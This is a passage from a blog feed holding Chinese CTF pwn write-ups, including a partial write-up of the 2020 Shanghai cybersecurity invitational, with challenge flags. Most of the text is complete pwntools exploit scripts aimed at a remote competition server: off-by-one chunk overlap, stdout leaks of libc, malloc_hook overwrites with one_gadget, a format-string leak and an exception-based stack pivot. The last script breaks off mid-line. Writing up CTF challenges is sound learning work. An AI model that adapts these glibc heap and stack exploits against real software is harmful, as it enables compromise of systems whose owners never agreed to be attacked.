class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sys = libc_base + libc.sym[<span class="hljs-string">'system'</span>]<span class="hljs-comment"># debug()</span>edit(<span class="hljs-number">1</span>,p64(sys))s(<span class="hljs-string">'sh'</span>)itr()</code></pre></div><h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p>此题这样的利用手法，十分的精巧和新奇，但是也十分依赖程序本身申请chunk的特性，使其成了其不是大众攻击的手段。</p><h2 id="总结用途"><a href="#总结用途" class="headerlink" title="总结用途"></a>总结用途</h2><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的<code>global_max_fast</code> 来使得更大的 chunk 可以被视为 fast bin，去执行一些 fast bin attack </li><li>作为FSOP的前奏</li><li>在可编辑的时候，劫持<code>main_arena+88</code> 也是一种新奇的攻击手段</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Unsorted-Bin-Attack-再学习&quot;&gt;&lt;a href=&quot;#Unsorted-Bin-Attack-再学习&quot; class=&quot;headerlink&quot; title=&quot;Unsorted_Bin_Attack  再学习&quot;&gt;&lt;/a&gt;&lt;code&gt;Unsorted_B
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="unsortedbin" scheme="http://chumen77.xyz/tags/unsortedbin/"/>
    
  </entry>
  
  <entry>
    <title>第六届上海市网络安全邀请赛2020CTF部分wp</title>
    <link href="http://chumen77.xyz/2020/11/14/%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B2020CTF%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/11/14/第六届上海市网络安全邀请赛2020CTF部分wp/</id>
    <published>2020-11-14T15:18:12.325Z</published>
    <updated>2020-11-17T14:38:01.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第六届上海市网络安全邀请赛2020CTF部分wp"><a href="#第六届上海市网络安全邀请赛2020CTF部分wp" class="headerlink" title="第六届上海市网络安全邀请赛2020CTF部分wp"></a>第六届上海市网络安全邀请赛2020CTF部分wp</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><div class="hljs"><pre><code class="hljs python">echo <span class="hljs-string">"ZmxhZ3t3MzFjMG1lNX0="</span> | base64 -d | tr <span class="hljs-number">5</span> <span class="hljs-number">6</span>flag&#123;w31c0me6&#125;</code></pre></div><h3 id="flag值："><a href="#flag值：" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{w31c0me6}</p><h2 id="lgtwo"><a href="#lgtwo" class="headerlink" title="lgtwo"></a>lgtwo</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><div class="hljs"><pre><code class="hljs c">v1 = sizelist[i];   sizelist[i] = v1 + <span class="hljs-number">1</span>;</code></pre></div><p>Add函数存在off by one</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>off by one 构造chunk overlaping</li><li>攻击stdout，泄漏libc地址</li><li>再次off by one 构造chunk overlaping，攻击malloc hook</li><li>改为one gadget，使用realloc 进行调节堆栈</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">45830</span>)    <span class="hljs-comment"># icqc4afd0d16403ab6b957cf18a53c6f</span>    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">"?"</span>,str(size))    sa(<span class="hljs-string">"?"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'?'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">"?"</span>,str(idx))    sa(<span class="hljs-string">"?"</span>,str(data)) <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#1</span>    free(<span class="hljs-number">0</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#2</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#5</span>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x68</span> +  <span class="hljs-string">'\xe1'</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#4</span>    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">3</span>)    edit(<span class="hljs-number">6</span>,<span class="hljs-string">'\x70'</span>)    edit(<span class="hljs-number">2</span>,p16(<span class="hljs-number">0xa5dd</span>))    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    payload = <span class="hljs-number">6</span> * p64(<span class="hljs-number">0</span>) + <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    edit(<span class="hljs-number">7</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./pwn')</span>        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>        io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">45830</span>)        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_basesys_addr = <span class="hljs-number">324832</span>+libc_baseadd(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#8</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#9</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)<span class="hljs-comment">#11</span>edit(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x68</span> +  <span class="hljs-string">'\xe1'</span>)free(<span class="hljs-number">9</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#9</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#12</span><span class="hljs-comment"># debug()</span>free(<span class="hljs-number">10</span>)edit(<span class="hljs-number">12</span>,p64(malloc_hook))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)one = <span class="hljs-number">0xf0364</span> + libc_baseadd(<span class="hljs-number">0x68</span>,p64(one))realloc = libc_base + libc.symbols[<span class="hljs-string">'realloc'</span>] + realloc[<span class="hljs-number">3</span>]payload = <span class="hljs-string">'\x00'</span> *<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)  + p64(one)+ p64(realloc) edit(<span class="hljs-number">13</span>,payload)<span class="hljs-comment"># debug()</span>itr()<span class="hljs-comment"># 0x45226 execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   rax == NULL</span><span class="hljs-comment"># 0x4527a execve("/bin/sh", rsp+0x30, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x30] == NULL</span><span class="hljs-comment"># 0xf0364 execve("/bin/sh", rsp+0x50, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x50] == NULL</span><span class="hljs-comment"># 0xf1207 execve("/bin/sh", rsp+0x70, environ)</span><span class="hljs-comment"># constraints:</span><span class="hljs-comment">#   [rsp+0x70] == NULL</span></code></pre></div><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/hYy5WA.png" srcset="/img/loading.gif" alt></p><h3 id="flag-值"><a href="#flag-值" class="headerlink" title="flag 值"></a>flag 值</h3><div class="hljs"><pre><code class="hljs undefined">flag&#123;<span class="hljs-number">25706</span>a3a293302d5e2b5814f02b6d064&#125;</code></pre></div><h2 id="EASY-ABNORMAL"><a href="#EASY-ABNORMAL" class="headerlink" title="EASY_ABNORMAL_"></a><code>EASY_ABNORMAL_</code></h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf （del的函数）</li><li>fmt （show name 的函数）</li><li>后门函数存在栈溢出</li></ul><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>先用fmt泄漏出来栈地址 libc地址备用，然后发现只能申请2次的chunk，已经不能进行fastbin attack，只能泄漏一下heap地址，重点研究下后门函数。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">sub_11A8</span><span class="hljs-params">()</span></span>&#123;  _QWORD *v0; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"INPUT:"</span>);  prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2L</span>L, &amp;unk_202070);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x28</span>uLL) &gt; <span class="hljs-number">0x10</span> ) <span class="hljs-comment">//溢出</span>  &#123;    v0 = (_QWORD *)_cxa_allocate_exception(<span class="hljs-number">8L</span>L, &amp;buf);    *v0 = <span class="hljs-string">"YOU ARE TOO YOUNG!"</span>;    _cxa_throw(v0, &amp;`typeinfo <span class="hljs-keyword">for</span>'<span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span>*, <span class="hljs-number">0L</span>L);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre></div><p>发现了存在8字节的栈溢出，可以溢出到rbp，但是此时已经破坏了canary。</p><p>去百度后发现<code>_cxa_allocate_exception</code>的妙用，覆盖好rbp后，其可以完成过canary的检测且可以配合上层函数的<code>leave ret</code>,完成一个栈迁移的效果。</p><p>参考链接：<br><a href="https://www.anquanke.com/post/id/89855#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/89855#h3-8</a></p><p>所以就覆盖rbp为heap的地址，在上面存好one gadget 地址，ret 上去即可。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">10012</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'4'</span>)    <span class="hljs-comment"># sla('dex&gt;',str(idx))</span>sla(<span class="hljs-string">'E:'</span>,<span class="hljs-string">'%p%p'</span>)sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'1'</span>)ru(<span class="hljs-string">'0x'</span>)stackbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)info_addr(<span class="hljs-string">'stackbase'</span>,stackbase)ru(<span class="hljs-string">'0x'</span>)libcbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x3c6780</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)one = libcbase + <span class="hljs-number">0x45226</span>add(p64(<span class="hljs-number">0</span>) + p64(one)*<span class="hljs-number">6</span>)add(p64(<span class="hljs-number">0</span>) + p64(one)*<span class="hljs-number">6</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)show()<span class="hljs-comment"># debug()</span>ru(<span class="hljs-string">'2:'</span>)heap = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'heap'</span>,heap)sla(<span class="hljs-string">'CHOICE'</span>,<span class="hljs-string">'23333'</span>)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(heap+<span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'INPUT'</span>,str(payload))itr()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/Cn5xPl.png" srcset="/img/loading.gif" alt></p><h3 id="flag-值-1"><a href="#flag-值-1" class="headerlink" title="flag 值"></a>flag 值</h3><div class="hljs"><pre><code class="hljs python">flag&#123;G00DB0YS&#125;</code></pre></div><h2 id="maj0rone"><a href="#maj0rone" class="headerlink" title="maj0rone"></a>maj0rone</h2><p>加了一堆的混淆代码，实际调试起来发现并不难。</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf （del函数）</li><li>堆溢出 （add函数，搭配edit函数进行堆溢出）</li></ul><p>其中堆溢出是因为:<br><img src="http://qiqianyun.chumen77.xyz/uPic/vddacU.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/9hGiy8.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/RuLBaK.png" srcset="/img/loading.gif" alt></p><p>其snprintf的返回值可以由输入的字符串长度控制，也导致了sizelist上的size被控制，申请一个小点的chunk，但是给了读入大于其长度size的字符串，即造成溢出。</p><p>其中add函数，上来的问question的check函数：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( input &lt;= <span class="hljs-number">512</span> )   v3 = input; <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">300</span> )   v4 = input; <span class="hljs-keyword">else</span>   v4 = <span class="hljs-number">300</span>; <span class="hljs-keyword">if</span> ( v4 &gt;= <span class="hljs-number">150</span> )   v5 = <span class="hljs-number">150</span>; <span class="hljs-keyword">else</span>   v5 = input; <span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">80</span> )   v6 = <span class="hljs-number">80</span>; <span class="hljs-keyword">else</span>   v6 = input; v9 = v6; <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">80</span> )   v6 = <span class="hljs-number">80</span>; <span class="hljs-keyword">if</span> ( v6 &gt;= <span class="hljs-number">83</span> )   v7 = <span class="hljs-number">80</span>; <span class="hljs-keyword">else</span>   v7 = v9; <span class="hljs-keyword">return</span> v7 == input;</code></pre></div><p>输入80即可。</p><h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用uaf 和堆溢出,来fastbin attack 打stdout，泄漏libc</li><li>再次fastbin attack打malloc hook 为 one gadget</li><li>用realloc调节堆栈</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-comment"># icqc4afd0d16403ab6b957cf18a53c6f</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">18523</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">"&gt;&gt; "</span>, str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(sz, ctx)</span>:</span>    choose(<span class="hljs-number">1</span>)    sla(<span class="hljs-string">'que'</span>,str(<span class="hljs-number">80</span>))    sla(<span class="hljs-string">"__?"</span>, str(sz))    sa(<span class="hljs-string">"no?"</span>, str(ctx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    choose(<span class="hljs-number">2</span>)    sla(<span class="hljs-string">"ex ?"</span>, str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    choose(<span class="hljs-number">3</span>)    sla(<span class="hljs-string">"?"</span>, str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx, ctx)</span>:</span>    choose(<span class="hljs-number">4</span>)    sla(<span class="hljs-string">"ex ?"</span>, str(idx))    sa(<span class="hljs-string">"__new_content"</span>, str(ctx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)     add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>    free(<span class="hljs-number">0</span>)    add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>)    <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>)    <span class="hljs-comment"># 2</span>    add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>)    <span class="hljs-comment"># 3</span>    add(<span class="hljs-number">0x68</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">0x100</span>)    <span class="hljs-comment"># 4</span>    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">3</span>)    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\xe0'</span>)    edit(<span class="hljs-number">4</span>,p16(<span class="hljs-number">0xa5dd</span>))    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    payload = <span class="hljs-number">6</span> * p64(<span class="hljs-number">0</span>) + <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)    edit(<span class="hljs-number">8</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./pwn')</span>        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>        io = remote(<span class="hljs-string">'123.56.52.128'</span>,<span class="hljs-number">18523</span>)        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span 